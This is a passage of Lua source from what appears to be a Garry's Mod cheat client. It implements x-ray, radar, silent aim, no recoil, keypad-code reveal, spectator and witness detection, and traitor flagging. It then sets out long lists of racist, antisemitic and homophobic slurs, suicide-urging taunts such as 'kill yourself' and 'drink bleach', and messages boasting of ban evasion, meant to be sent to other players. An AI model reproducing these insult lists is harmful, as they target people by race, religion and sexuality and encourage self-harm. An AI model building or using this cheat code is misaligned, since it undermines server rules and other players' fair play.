    CamData.h = ScrH() / (AB.NumberVars.MirrorSize / 10)

    CamData.drawviewmodel = false

    CamData.drawhud = false

    CamData.fov = 90

    render.RenderView( CamData )

end



if AB.Vars.Mirror then

    local CamData = {}

    if AB.NumberVars.MirrorAxis == 0 then

        CamData.angles = Angle(0,me:EyeAngles().yaw - 180,0)

    elseif AB.NumberVars.MirrorAxis == 1 then

        CamData.angles = Angle(me:EyeAngles().pitch,me:EyeAngles().yaw - 180,0)

    else

        CamData.angles = Angle(-me:EyeAngles().pitch,me:EyeAngles().yaw - 180,0)

    end



    CamData.origin = me:GetPos()+Vector(0,0,50)

    CamData.x = AB.NumberVars.MirrorX

    CamData.y = AB.NumberVars.MirrorY

    CamData.w = ScrW() / (AB.NumberVars.MirrorSize / 10)

    CamData.h = ScrH() / (AB.NumberVars.MirrorSize / 10)

    CamData.drawviewmodel = false

    CamData.drawhud = false

    CamData.fov = 90

    render.RenderView( CamData )

end







if AB.Vars.PreviewTarget then

    local t = AB.AimbotPreviewTarget

    if isvector( t ) then 

        local p = t:ToScreen()

        surface.SetDrawColor(Color(255,155,55,255))

        surface.DrawRect(p.x-1, p.y + 6, 2, 20)

        surface.DrawRect(p.x-1, p.y - (6 + 20), 2, 20)

        surface.DrawRect(p.x + 6, p.y-1, 20, 2)

        surface.DrawRect(p.x - (6 + 20), p.y-1, 20, 2)

    end

end





if AB.Vars.Radar then

    local size = AB.NumberVars.RadarSize

    local fov = AB.NumberVars.RadarZoom

    local x = AB.NumberVars.RadarX

    local y = AB.NumberVars.RadarY



    surface.SetDrawColor(AB.DefaultScheme.r, AB.DefaultScheme.g, AB.DefaultScheme.b, AB.NumberVars.RadarAlpha)

    surface.DrawRect(x - 2, y - 2, size + 4, size + 4)





    surface.SetDrawColor(Color(20, 20, 20, AB.NumberVars.RadarAlpha))

    surface.DrawRect(x, y, size, size)

    surface.SetDrawColor(Color(30, 30, 30, 255))

    surface.DrawLine(x, y, x + (size / 2), y + (size / 2))

    surface.DrawLine(x + size, y, x + (size / 2), y + (size / 2))



    surface.SetDrawColor(AB.DefaultScheme)

    surface.DrawRect((x -2)+ (size/2), (y-2) + (size/2), 4, 4)



    for key, ply in pairs(player.GetAll()) do

        local teamcol, teamcol2 = AB.GetESPColor( ply )





        if ply != me and !AB.IsDead( ply ) then

            local lx = me:GetPos().x - ply:GetPos().x

            local ly = me:GetPos().y - ply:GetPos().y

            local ang = EyeAngles().y

            local cos = math.cos(math.rad(-ang))

            local sin = math.sin(math.rad(-ang))

            local px = (ly * cos) + (lx * sin)

            local py = (lx * cos) - (ly * sin)

            px = px / fov

            py = py / fov

            px = math.Clamp(px, -(size * 0.50), size * 0.50)

            py = math.Clamp(py, -(size * 0.50), size * 0.50)

            local name = player.GetAll()[key]:Nick()

            draw.SimpleText(name, "default", x + size - (size * 0.50) + px - 13, y + size - (size * 0.50) + py - 7, teamcol2, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)

            surface.SetDrawColor(teamcol)

            surface.DrawRect(x + size - (size * 0.50) + px, y + size - (size * 0.50) + py, 3, 3)



            end



        end



end



if AB.Vars.Crosshair then

    local hitpos = util.TraceLine ({

        start = me:GetShootPos(),

        endpos = me:GetShootPos() + me:GetAimVector() * 4096,

        filter = me,

        mask = MASK_SHOT

    }).HitPos



    local screenpos = hitpos:ToScreen()

    local x = screenpos.x

    local y = screenpos.y



    surface.SetDrawColor(Color(255, 255, 255, 255))

    surface.DrawRect((ScrW() / 2) - 1, (ScrH() / 2) - 1, 2, 2)

    surface.DrawRect(x-1, y + 6, 2, 20)

    surface.DrawRect(x-1, y - (6 + 20), 2, 20)

    surface.DrawRect(x + 6, y-1, 20, 2)

    surface.DrawRect(x - (6 + 20), y-1, 20, 2)



    if AB.CrossHairAlpha > 0 then AB.CrossHairAlpha = math.Clamp(AB.CrossHairAlpha - 6, 0, 255) end

    surface.SetDrawColor(Color(255, 255, 255, AB.CrossHairAlpha))

    surface.DrawLine(x - 24, y + 24, x - 6, y + 6)

    surface.DrawLine(x + 24, y + 24, x + 6, y + 6)

    surface.DrawLine(x - 24, y - 24, x - 6, y - 6)

    surface.DrawLine(x + 24, y - 24, x + 6, y - 6)





end









if isvector( AB.CurrentBase ) then

    local sc = (AB.CurrentBase + Vector( 0, 0, 10 )):ToScreen()



    draw.SimpleText("My Base", "default", sc.x, sc.y - 42, AB.DefaultScheme, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)

    draw.SimpleText( AB.ToMetric( LocalPlayer():GetPos():Distance( AB.CurrentBase ) ).."m", "default", sc.x, sc.y - 30, AB.DefaultScheme, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)

    surface.SetDrawColor( Color(205,205,255, 100 ) )

    draw.NoTexture()

    local triangle = {

        { x = sc.x - 10, y = sc.y - 20 },

        { x = sc.x + 10, y = sc.y - 20 },

        { x = sc.x, y = sc.y },

    }

    surface.DrawPoly( triangle )



end



if AB.Vars.KeypadJew then



    local e = me:GetEyeTrace().Entity

    if IsValid(e) and string.find( e:GetClass(), "Keypad") then

        local text;

        local color;

        if(e.code && e.code != "") then

            text = e.code;

            color = Color( 105, 255, 105, 150 )

        elseif(e.tempCode && e.tempCode != "") then

            text = e.tempCode;

            color = Color( 250, 150, 150, 150 )

        else

            text = "Unknown"

            color = Color(150,150,150,150)

        end

--        draw.WordBox( 8, ScrW() / 2, ScrH() / 2, text, "Default", color, Color(255,255,255,255) )

        

        surface.SetDrawColor( Color( 0,0,50, 150 ) )

        surface.SetMaterial( grad )

        surface.DrawTexturedRect( ScrW() / 2 + 57, ScrH() / 2 - 7, 50, 15 )

        draw.SimpleText(text, "DermaDefault", ScrW() / 2 + 60, ScrH() / 2, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)



    end

    

    for k,v in pairs(ents.GetAll()) do

        if IsValid(v) and string.find( v:GetClass(), "Keypad") then

            if v != e and me:GetPos():Distance( v:GetPos() ) < 8000 then

                local pos = v:GetPos():ToScreen()

                if pos.x > 0 and pos.x < ScrW() and pos.y > 0 and pos.y < ScrH() then

                    if (v.code && v.code != "") then

                        surface.SetDrawColor( Color( 0,0,50, 150 ) )

                        surface.SetMaterial( grad )

                        surface.DrawTexturedRect( pos.x, pos.y, 50, 15 )

                        draw.SimpleText( v.code, "DermaDefault", pos.x + 5, pos.y + 6, Color( 105, 255, 105, 150 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)



--                        draw.WordBox( 8, pos.x-5, pos.y-5, v.code, "Default", Color( 0, 255, 0, 150 ), Color(255,255,255,255) )

                    else

                        if(v.tempCode && v.tempCode != "") then

                            surface.SetDrawColor( Color( 0,0,50, 150 ) )

                            surface.SetMaterial( grad )

                            surface.DrawTexturedRect( pos.x, pos.y, 50, 15 )

                            draw.SimpleText( v.tempCode, "DermaDefault", pos.x + 5, pos.y + 6, Color( 250, 150, 150, 150 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)

                        else

                            surface.SetDrawColor( Color( 0,0,50, 150 ) )

                            surface.SetMaterial( grad )

                            surface.DrawTexturedRect( pos.x, pos.y, 50, 15 )

                            draw.SimpleText( "Unknown", "DermaDefault", pos.x + 5, pos.y + 6, Color(150,150,150,150), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)

                        end

                    end

                end

            end

        end

    end



end





if AB.Vars.Bhop then

    local sped = me:GetVelocity():Length()

    draw.SimpleText("Velocity: "..math.Round( sped ), "DermaDefault", (ScrW() / 2), ScrH() - 60, AB.DefaultScheme, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )

    surface.SetDrawColor( AB.DefaultScheme )

    surface.DrawOutlinedRect( (ScrW() / 2) - 100, ScrH() - 50, 200, 10 )

    surface.SetDrawColor( Color( AB.DefaultScheme.r, AB.DefaultScheme.g, AB.DefaultScheme.b, 100 ) )

    surface.DrawRect( (ScrW() / 2) - 100, ScrH() - 50, math.Clamp( (sped / 2000) * 200, 0, 200 ), 10 )

end





if AB.Vars.WitnessDetector then



    if #AB.Witnesses > 0 then

        surface.SetDrawColor( Color(50, 50, 90, 255) )

        surface.DrawRect( (ScrW() / 2) - 150, 0, 300, (#AB.Witnesses * 20) + 30)

        surface.SetDrawColor( Color(0, 0, 0, 250) )

        surface.DrawRect( (ScrW() / 2) - 145, 25, 290, (#AB.Witnesses * 20) )

        draw.SimpleText("These people can see you", "DermaDefault", (ScrW() / 2) - 63, 10, Color(255, 255, 255, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)





        for k, v in pairs(AB.Witnesses) do

            if !v:IsValid() then continue end -- let this pass silently, it only spams briefly when some faggot dcs anyway

            draw.SimpleText(v:Nick(), "DermaDefault", (ScrW() / 2) - 140, 8 + (k * 20), AB.GetESPColor( v ) )

        end



    end    

end



if AB.Vars.SpectatorDetector then

    local starty = 0

    if AB.Vars.WitnessDetector then starty = (#AB.Witnesses * 20) + 35 end



    if AB.TheyHaveEyesEverywhere and #AB.TheyHaveEyesEverywhere > 0 then

        surface.SetDrawColor( Color(50, 50, 90, 255) )

        surface.DrawRect( (ScrW() / 2) - 150, starty, 300, (#AB.TheyHaveEyesEverywhere * 20) + 30)

        surface.SetDrawColor( Color(0, 0, 0, 250) )

        surface.DrawRect( (ScrW() / 2) - 145, starty + 25, 290, (#AB.TheyHaveEyesEverywhere * 20) )

        draw.SimpleText("These people are spectating you", "DermaDefault", (ScrW() / 2) - 63, starty + 10, Color(255, 255, 255, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)





        for k, v in pairs( AB.TheyHaveEyesEverywhere ) do

            if !v:IsValid() then continue end -- let this pass silently, it only spams briefly when some faggot dcs anyway

            draw.SimpleText(v:Nick(), "DermaDefault", (ScrW() / 2) - 140, starty + 8 + (k * 20), AB.GetESPColor( v ) )

        end



    end    

end



-- ent scanner

if AB.EntScanner then



    local c = me:GetEyeTrace()

    local screenpos = c.HitPos:ToScreen()

    local x = screenpos.x

    local y = screenpos.y

    local pulse = math.abs( math.sin( CurTime() * 2 ) )

    surface.SetDrawColor( AB.DefaultScheme )

    surface.SetMaterial( scanmat )

    surface.DrawTexturedRect( x - (15 + (pulse * 15)), y - (15 + (pulse * 15)), 30 + (pulse * 30), 30 + (pulse * 30) )

    surface.SetDrawColor( AB.DefaultScheme2 )

    surface.DrawTexturedRect( x - (12 + (pulse * 12)), y - (12 + (pulse * 12)), 24 + (pulse * 24), 24 + (pulse * 24) )



    if c.Entity and c.Entity:IsValid() then

        AB.EntScannerTab = {}

        local e = c.Entity

        AB.EntScannerEnt = e



        if e:IsPlayer() then 

            table.insert( AB.EntScannerTab, e:Nick() )

            table.insert( AB.EntScannerTab, {e:SteamID(), Color(255,255,255)} )

            table.insert( AB.EntScannerTab, {AB.GetRank( e ), Color( 255, 100, 0 )} )

            table.insert( AB.EntScannerTab, "Health: "..e:Health().."% Armor: "..e:Armor().."%" )

            if DarkRP then

                table.insert( AB.EntScannerTab, {DarkRP.formatMoney(e:getDarkRPVar("money")) or "$ERROR", Color( 50, 255, 50)} )

                table.insert( AB.EntScannerTab, {"Real Name: "..e:SteamName(), Color( 150, 150, 150)} )

            end



            if e:GetActiveWeapon() then table.insert( AB.EntScannerTab, "Holding: "..(e:GetActiveWeapon():GetClass() or "None" ) ) end

            local weps = {}

            for _, g in pairs( e:GetWeapons() ) do table.insert( weps, g:GetClass() )end

            table.insert( AB.EntScannerTab, {table.ToString( weps ), Color(155,155,255)} )

        end

        table.insert( AB.EntScannerTab, e:GetClass() )

        table.insert( AB.EntScannerTab, e:GetModel() )

        table.insert( AB.EntScannerTab, "Distance: "..AB.ToMetric(e:GetPos():Distance( me:GetPos() )).."m" )



    end



    local textx, texty = ScrW() / 2 + 50, ScrH() / 2

    for k, v in pairs(AB.EntScannerTab) do

        if istable( v ) then

            draw.SimpleTextOutlined( v[1], "default", textx + 40, (texty - 40) + (k * 12), v[2], 0, 0, 1, Color(0,0,0) )

        else

            draw.SimpleTextOutlined( v, "default", textx + 40, (texty - 40) + (k * 12), AB.DefaultScheme, 0, 0, 1, Color(0,0,0) )

        end

    end





end



AB.MemoryDebug["hud"] = gcinfo() - memfootprint



end

hook.Add("HUDPaint", "ab_hud", AB.Vision)









---------------------------------------------- NEW XRAY HERE -------------------------------------------------





/*

if AB.Vars.Xray then

        

    for k, v in pairs(ents.GetAll()) do



        if AB.ToMetric(me:GetPos():Distance(v:GetPos())) > AB.NumberVars.XrayDistance then if v:GetColor().a == 100 then v:SetColor(Color(255,255,255,255)) end continue end



        -- set rendermode none?



        if AB.Vars.XrayPlayers then

            if v:IsValid() and v:IsPlayer() and v != LocalPlayer() and !AB.IsDead( v ) and AB.OnScreen( v ) then

                cam.Start3D(EyePos(),EyeAngles())

                if AB.Vars.NoChamColours then

                    v:SetMaterial(AB.mat1)

                    v:SetRenderMode(4)

                    v:SetColor(xraytrans)

                    render.SuppressEngineLighting( true )

                    render.MaterialOverride( AB.mat1 )

                end

                if AB.Vars.PKChams and AB.Vars.NoChamColours then render.SetColorModulation( 0, 1, 0 ) render.SetBlend(0.8) else render.SetColorModulation( AB.ColScheme.x, AB.ColScheme.y, AB.ColScheme.z ) render.SetBlend(0.3) end

                v:DrawModel()

                if IsValid( v:GetActiveWeapon() ) then

                    if AB.Vars.NoChamColours then render.SetColorModulation( AB.ColScheme2.x, AB.ColScheme2.y, AB.ColScheme2.z ) end

                    v:GetActiveWeapon():DrawModel()

                end

                render.SetBlend(1)

                render.SuppressEngineLighting( false )

                render.MaterialOverride( )

--                v:SetColor(Color(255,255,255,255))

                cam.End3D()



            end

        end

        if AB.Vars.XrayProps then

            if v:IsValid() and v:GetClass() == "prop_physics" and AB.OnScreen( v ) then

            cam.Start3D(EyePos(),EyeAngles())

            if AB.Vars.NoChamColours then

                v:SetMaterial(AB.mat1)

                v:SetRenderMode(4)

                v:SetColor(xraytrans)

                render.SuppressEngineLighting( true )

                render.MaterialOverride( AB.mat1 )

            end

            if AB.Vars.PKChams and AB.Vars.NoChamColours then render.SetColorModulation( 1, 0.2, 0 ) render.SetBlend(0.6) else render.SetColorModulation( AB.ColScheme2.x, AB.ColScheme2.y, AB.ColScheme2.z ) render.SetBlend(0.3) end

            v:DrawModel()

            render.SetBlend(1)

            render.SuppressEngineLighting( false )

            render.MaterialOverride( )

--            v:SetColor(Color(255,255,255,255))

            cam.End3D()

            end

        end





        if AB.Vars.XrayEntfinder then

            local drawing = false



            for i,p in pairs(AB.MarkedEnts) do

                if v:GetClass() == p then

                    drawing = true

                end

            end



            if drawing and AB.OnScreen( v ) then

            cam.Start3D(EyePos(),EyeAngles())

            v:SetMaterial(AB.mat1)

            v:SetRenderMode(4)

            v:SetColor(xraytrans)

            render.SuppressEngineLighting( true )

            render.MaterialOverride( AB.mat1 )

            render.SetColorModulation( AB.ColScheme2.x, AB.ColScheme2.y, AB.ColScheme2.z )

            render.SetBlend(0.3)

            v:DrawModel()

            render.SetBlend(1)

            render.SuppressEngineLighting( false )

            render.MaterialOverride( )

--            v:SetColor(Color(255,255,255,255))

            cam.End3D()

            end



        end







    end

end

*/





function AB.DrawXrayEntity( ent, col, domat, ghost )

    cam.Start3D( EyePos(), EyeAngles() )

        cam.IgnoreZ( true )

        if domat then render.MaterialOverride( AB.Mat1 ) end

        render.SuppressEngineLighting( true )

        render.SetColorModulation( col.r / 255, col.g / 255, col.b / 255 )

        if ghost then render.SetBlend( 0.3 ) end

        ent:DrawModel()

        render.SuppressEngineLighting( false )

        cam.IgnoreZ( false )

        render.MaterialOverride()

    cam.End3D()

end





function AB.DoXray()

    local me = LocalPlayer()

    if !me or !me:IsValid() or !AB.Vars.Xray then return end



    local fags = ents.GetAll()

--    table.sort( fags, function( a, b ) return a:GetPos():DistToSqr( EyePos() ) > b:GetPos():DistToSqr( EyePos() ) end )



    for k, v in ipairs( fags ) do

        if !AB.OnScreen( v, 50 ) or AB.ToMetric( me:GetPos():Distance( v:GetPos() ) ) > AB.NumberVars.XrayDistance then continue end



        -- players loop

        if AB.Vars.XrayPlayers and v:IsPlayer() then

            if v == LocalPlayer() or !v:Alive() then continue end

            local teamcol, teamcol2

            if AB.Vars.TeamColors then

                teamcol = team.GetColor(v:Team())

                teamcol2 = Color(math.Clamp(teamcol.r - 100, 0, 255), math.Clamp(teamcol.g - 100, 0, 255), math.Clamp(teamcol.b - 100, 0, 255), 255)

            elseif AB.Vars.PKChams then

                teamcol = Color( 0, 255, 0 ) teamcol2 = Color( 255, 0, 0 )

            else

                teamcol = AB.DefaultScheme teamcol2 = AB.DefaultScheme2

            end



            AB.DrawXrayEntity( v, teamcol, AB.Vars.NoChamColours, !AB.Vars.XraySolid )



            local gun = v:GetActiveWeapon()

            if gun and gun:IsValid() then AB.DrawXrayEntity( gun, teamcol2, AB.Vars.NoChamColours, !AB.Vars.XraySolid ) end

        end



        -- props loop

        if AB.Vars.XrayProps and v:GetClass() == "prop_physics" then

            local teamcol, teamcol2

            if AB.Vars.PKChams then

                teamcol = Color( 0, 255, 0 ) teamcol2 = Color( 255, 0, 0 )

            else

                teamcol = AB.DefaultScheme teamcol2 = AB.DefaultScheme2

            end

            AB.DrawXrayEntity( v, teamcol2, AB.Vars.NoChamColours, true )

        end



        -- ents loop

        if AB.Vars.XrayEntfinder and table.HasValue( AB.MarkedEnts, v:GetClass() ) then

            local teamcol, teamcol2

            if AB.Vars.PKChams then

                teamcol = Color( 255, 255, 0 ) teamcol2 = Color( 255, 255, 0 )

            else

                teamcol = AB.DefaultScheme teamcol2 = AB.DefaultScheme2

            end

            AB.DrawXrayEntity( v, teamcol, AB.Vars.NoChamColours, true )

        end



    end

end



hook.Add( "PreDrawHUD", "AB_NewXray", AB.DoXray )













function AB.PKBeamsCore()

if AB.Vars.PKVerticalBeams then

    render.SetMaterial( beammat )

    for k, v in pairs( player.GetAll()) do

        if !v:Alive() or v == LocalPlayer() then continue end

        render.DrawBeam( v:GetPos() + Vector( 0, 0, -2000 ), v:GetPos() + Vector( 0, 0, 2000 ), 50, 0, 1, Color(255,255,255) )

    end

end

end

hook.Add("PostDrawTranslucentRenderables", "ab_beams", AB.PKBeamsCore)





function AB.ToggleEntityScanner()

    if !AB.EntScanner then

        AB.EntScanner = true

        AB.ScannerButton1 = AB.MakeFloatingButton( ScrW() / 2 - 180, (ScrH() / 2) - 50, "Copy to Console", function() print(AB.EntScannerEnt)

            for k, v in pairs( AB.EntScannerTab ) do

                if istable( v ) then MsgC( v[2], v[1].."\n" ) else MsgN( v ) end

            end

        end)



        AB.ScannerButton2 = AB.MakeFloatingButton( ScrW() / 2 - 180, (ScrH() / 2) - 20, "Add class to ESP", function()

            if table.HasValue( AB.MarkedEnts, AB.EntScannerEnt:GetClass() ) then AB.ChatText( "Already marked!", Color(255,205,205) ) return end

            AB.ChatText( "Added "..AB.EntScannerEnt:GetClass().." to marked ent classes", Color(255,255,255) )

            table.insert(AB.MarkedEnts, AB.EntScannerEnt:GetClass())

        end)



        AB.ChatText( "Enabled Entity Scanner", Color(255,255,255) )

    else

        AB.EntScanner = false

        AB.ChatText( "Disabled Entity Scanner", Color(255,205,205) )

        if AB.ScannerButton1 then AB.ScannerButton1:Remove() end

        if AB.ScannerButton2 then AB.ScannerButton2:Remove() end

    end

end



AB.MouseReleased = false

function AB.ToggleFreeMouse()

    if !AB.MouseReleased then

        gui.EnableScreenClicker( true )

        AB.MouseReleased = true

    else

        gui.EnableScreenClicker( false )

        AB.MouseReleased = false

    end

end

concommand.Add("ace_toggle_mouse_cursor", AB.ToggleFreeMouse)



function AB.CalcView( ply, pos, angles, fov )

local me = LocalPlayer()

if !me:IsValid() or !me:Alive() or me:GetViewEntity() != me or me:InVehicle() then return end



local tps = {}



    if AB.Vars.SilentAim and !AB.Vars.Thirdperson and lastoldang and isangle( lastoldang ) then

        tps.origin = me:EyePos()

        tps.angles = lastoldang

        tps.fov = fov

        return tps

    end



    if AB.Vars.NoRecoil and !AB.Vars.Thirdperson then

--        tps.origin = me:EyePos()

        tps.angles = me:EyeAngles()

--        tps.fov = fov

        return tps

    end



    if AB.Vars.Thirdperson then

        if AB.RenderPanic then return end

        local trace = util.TraceLine( { start = pos - ply:GetForward() * 2, endpos = pos - angles:Forward() * AB.NumberVars.TPSDistance, filter = player.GetAll(), mask = MASK_SHOT } )

        tps.origin = trace.HitPos + ply:GetForward() * 20 + ply:GetRight() * AB.NumberVars.TPSOffset

        tps.angles = angles

        tps.fov = fov

        return tps

    end



end

hook.Add("CalcView", "ab_calcview", AB.CalcView)





function AB.ICanSeeMyAss( ply )

if AB.Vars.Thirdperson then return true end

return false

end

hook.Add("ShouldDrawLocalPlayer", "ab_drawplayer", AB.ICanSeeMyAss)



-- it would be very wise to keep this disabled for now

/*

function AB.Transparency()

if AB.Vars.XrayProps then

    for k, v in pairs(ents.GetAll()) do

        render.SuppressEngineLighting( true )

    end

end

end



hook.Add("RenderScene", "ab_transparency", AB.Transparency)

*/



function AB.CheckWitnesses()

if !AB.Vars.WitnessDetector then return end

AB.Witnesses = {}

for k, v in pairs(player.GetAll()) do

    if v:IsValid() and v != LocalPlayer() then

        local Trace = {}

        Trace.start  = LocalPlayer():EyePos() + Vector(0, 0, 32)

        Trace.endpos = v:EyePos() + Vector(0, 0, 32)

        Trace.filter = {v, LocalPlayer()}



        TraceRes = util.TraceLine(Trace)



        if !TraceRes.Hit then

            if (v:EyeAngles():Forward():Dot((LocalPlayer():EyePos() - v:EyePos())) > math.cos(math.rad(45))) then

                if !table.HasValue(AB.Witnesses, v) then table.insert( AB.Witnesses, v ) end

            end

        end



    end

end

end

timer.Create("ab_WitnessCheck", 0.5, 0, AB.CheckWitnesses)



local nxtscan = CurTime()

function AB.ScanForTraitors()

    if nxtscan > CurTime()  then return end

/*

    for _, ply in pairs(player.GetAll()) do

        if ply == LocalPlayer() then continue end

        if ply:GetRole() == ROLE_DETECTIVE then continue end

        if !ply:GetActiveWeapon() or !ply:GetActiveWeapon():IsValid() then continue end



        if ply:GetActiveWeapon().CanBuy and table.HasValue( ply:GetActiveWeapon().CanBuy, ROLE_TRAITOR ) and !table.HasValue( AB.Traitors, ply ) then

            table.insert( AB.Traitors, ply )

            surface.PlaySound("buttons/bell1.wav")

            AB.ChatText( ply:Nick().." is a filthy nasty traitor!", Color(255,100,0) )

        end

        

    end

*/

    nxtscan = CurTime() + 0.5



    for _,v in pairs(ents.GetAll()) do

        if GetRoundState() == 3 and v:IsWeapon() and type(v:GetOwner()) == "Player" and v.Buyer == nil and v.CanBuy and table.HasValue(v.CanBuy, 1) and !table.HasValue(AB.Traitors, v:GetOwner()) then

            local owner = v:GetOwner()

            if !owner:IsValid() then continue end

            if owner:GetRole() == 2 then

                v.Buyer = owner

            else

                table.insert(AB.Traitors, owner)

                AB.ChatText( ply:Nick().." is a filthy nasty traitor! He bought a: "..v:GetClass(), Color(255,100,0) )

            end

        elseif GetRoundState() != 3 then

            AB.Traitors = {}

        end

    end



end



function AB.ClearTraitors()

    AB.Traitors = {}

end











function AB.ChokePackets( val )

    if val then

        odium.engine.SetChokedPacket( 0 )

    end



end















function AB.XrayShutoff()

for k, v in pairs(ents.GetAll()) do

    v:SetColor(Color(255,255,255,255))

end

end



AB.IsTTT = false



local demotereasons = {

    "Nigger",

    "Faggot",

    "Dickhead",

    "Cuckold",

    "RDM",

    "Shit eating faggot",

    "RDA",

    "NLR",

    "Fucking sped",

    "kys",

    "Shit server tbh fam",

    "Bad scripts",

    "Skid",

    "Admin abuse",

    "Abusing",

    "Fuckwit",

    "DarkRP Player",

}







------------------------------------------------------------------------INSULT GENERATOR--------------------------------------------------------------------------------------







local openers = {

    "get fucked",

    "eat shit",

    "fuck a baboon",

    "suck my dingleberries",

    "choke on steaming cum",

    "die in a fire",

    "gas yourself",

    "sit on garden shears",

    "choke on scrotum",

    "shove a brick up your ass",

    "swallow barbed wire",

    "move to sweden",

    "fuck a pig",

    "bow to me",

    "suck my ball sweat",

    "come back when you aren't garbage",

    "i will piss on everything you love",

    "kill yourself",

    "livestream suicide",

    "neck yourself",

    "go be black somewhere else",

    "rotate on it",

    "choke on it",

    "blow it out your ass",

    "go browse tumblr",

    "go back to darkrp",

    "sit on horse cock",

    "drive off a cliff",

    "rape yourself",

    "get raped by niggers",

    "fuck right off",

    "you mother is a whore",

    "come at me",

    "go work the corner",

--    "you are literal cancer",

    "why haven't you killed yourself yet",

    "why do you even exist",

    "shoot your balls off with a shotgun",

    "sterilize yourself",

    "convert to islam",

    "drink bleach",

    "remove yourself",

    "choke on whale cock",

    "suck shit",

    "suck a cock",

    "lick my sphincter",

    "set yourself on fire",

    "drink jenkem",

    "get beaten to death by your dad",

    "choke on your uncle's cock",

    "get sat on by a 200kg feminist",

    "blow off",

    "join isis",

    "stick your cock in a blender",

    "OD yourself on meth",

    "lie under a truck",

    "lick a wall socket",

    "swallow hot coals",

    "die slowly",

    "explode yourself",

    "swing from the noose",

    "end yourself",

    "take your best shot",

    "get shot in a gay bar",

    "drink pozzed cum",

    "marry a muslim",

    "get a better cheat",

    "rub your dick on a cheese grater",

    "wrap a rake with barbed wire and sodomize yourself",

    "close your gaping cunt",

}



local joiners = {

    "cancer infested",

    "cock sucking",

    "fuck faced",

    "cunt eyed",

    "nigger fucking",

    "candy ass",

    "fairy ass fucking",

    "shit licking",

    "unlovable",

    "disgusting",

    "degenerate",

    "fuck headed",

    "dick lipped",

    "autismal",

    "gook eyed",

    "mongoloided",

    "cunt faced",

    "dick fisted",

    "worthless",

    "bleeding cunted",

    "hillary loving",

    "maggot infested",

    "boot lipped",

    "chink eyed",

    "shit skinned",

    "nigger headed",

    "lgbt supporting",

    "cum stained",

}



local enders = {

    "fuck face",

    "poofter",

    "jew cunt",

    "fagmaster",

    "goat rapist",

    "rag head",

    "cock cheese",

    "vaginaphobe",

    "coon",

    "nigger",

    "slag cunt",

    "garbage man",

    "paeodophile",

    "kiddy toucher",

    "pony fucker",

    "tumblrite",

    "sperglord",

    "gorilla's dick",

    "shit licker",

    "shit slick",

    "redditor",

    "pig fucker",

    "spastic",

    "cuckold",

    "chode gobbler",

    "fuckwit",

    "retard",

    "mongoloid",

    "elephants cunt",

    "cunt",

    "gook",

    "fag lord",

    "shit stain",

    "mpgh skid",

    "batch coder",

    "pony fucker",

    "furfag",

    "half caste",

    "double nigger",

    "cock socket",

    "cunt rag",

    "anal wart",

    "maggot",

    "knob polisher",

    "fudge packer",

    "cock slave",

    "trashmaster",

    "shitskin",

    "curry muncher",

    "gator bait",

    "bootlip",

    "camel jockey",

    "wog cunt",

    "hooknosed kike",

    "feminist",

    "wop cunt",

    "abbo",

    "porch monkey",

    "dago",

    "anal secretion",

    "pig cunt",

    "insect",

    "sub human",

    "mental defect",

    "fat whore",

    "cunt blood",

    "cunt rag",

    "cotton picker",

    "bum tickling fag",

    "degenerate faggot",

    "smegma lump",

    "darkie",

    "fuck toy",

    "underage midget cunt",

    "twelvie",

    "faggot teenager",

    "ankle biter",

    "fat cunt american",

    "bernie loving washout",

    "fucking failure",

    "cum dumpster",

    "waste of skin",

    "petrol sniffing coon",

    "jenkem bottle",

    "dirty jew",

    "darkrp admin",

    "cuck master",

    "barrel of piss",

    "tankard of shit",

    "cock wart",

}



local adminstarts = {

    "How much did you pay for that staff rank",

    "Nice server you got here",

    "How much did that gay ULX rank cost",

    "I'll be back to shit on you again",

    "This is only my first alt account",

    "What autist gave you a staff rank",

    "Banning me only makes my cock harder",

    "I'll be back on a new account in 10 minutes",

    "Your server deserves to be destroyed",

    "It's been fun wrecking this shit hole",

    "Stop touching me with your physgun",

    "Letting you have admin was a mistake",

    "Do what you must, I have already won",

    "Bans mean nothing to me",

    "You should appreciate me showing you how to break your terrible server security",

    "I hunt down faggots like you for sport",

    "I am better than you in every single way",

    "I bypassed your anticheat and I'll bypass your ban too",

    "Only power mad midget cucks become staff on darkrp",

    "Lmao another bad server ruined",

    "Watch me rejoin on a VPN",

}



-- i gave myself terminal autism writing these

local cancerstrike = {

    "LOL fuk u silver scUm",

    "nice aim doEs It cume in NOT N00be?",

    "u r terible my doode",

    "u almost hit me that time LOL",

    "ur aim iz a joke my man",

    "get shrekt skrub xdddd",

    "u just got shitted on kidddd",

    "i bet u r silver on csgo xD",

    "u never stood a chance against my pSkillz",

    "ur just 2bad to kill me :^(",

    "dam im good",

    "u wil never beat odium hax kidd :^)",

    "eat shit and die xdd",

    "do u use xashpass cos ur 2 bad to bypass cac :D",

    "i laugh at ur shit skillz :D",

    "get fukn owned kid xd",

    "i kill u every time u shud try harder :^(",

    "all u can do is die LOL",

    "N00bez like u cant beat me LOL",

    "u tried but im jus 2 gud 4 u",

    "u cant even hit me LOL uninstall kid xd",

    "git GUD skrub u r an embarasment",

    "pathetic LOL",

    "2 bad so sad u just bad :^(",

    "im global elit in gmod xd",

    "thx 4 free kill loser :D",

    "r u even trying???",

    "top kekt u got rekt",

    "fuken smashed kunt :D",

    "u shud add me so i can teach u how 2 shoot LOL",

    "ur jus 2 weak and sad to beat me xd",

    "looks liek ur sad life isnt working out 2 well 4 u :D",

    "dats all u got??? LOL!",

}



local supercancerstrike = {

    "dont upsetti hav some spagetti",

    "eat my asse like a bufet (3 corse meal xd)",

    "i ownt u in ur gay butth0le",

    "umade noobe?",

    "le troled hard",

    "go wach naturo and play wif urself fag REKT",

    "LOL i fuckd u so hard just like ur mum lst nit fag",

    "u play liek a blynd stefen hawkin haha",

    "ARE U GUEYS NEW??",

    "are u as bad at life as u are in gmod??",

    "omg this is 2 ezy are U even trying??",

    "why dont u go play halo an fist ur butthol faget",

    "hey granma is that u???? LOL so bad",

    "time for you 2 uninstale the game shit stane",

    "congrtulations ur the worlds worst gmod player",
